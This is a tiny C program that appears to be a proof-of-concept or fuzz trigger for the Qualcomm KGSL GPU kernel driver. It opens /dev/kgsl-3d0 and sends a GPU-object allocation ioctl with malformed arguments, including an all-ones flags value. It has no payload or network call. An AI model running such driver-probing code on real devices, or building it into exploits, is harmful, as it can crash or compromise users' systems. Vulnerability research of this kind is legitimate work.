#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(0x09, 0x40, void*)
int main() {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if(fd < 0) return 1;
    long args[10] = {0};
    args[0] = 0x1000;
    args[1] = 0xffffffff;
    ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, args);
    return 0;
}
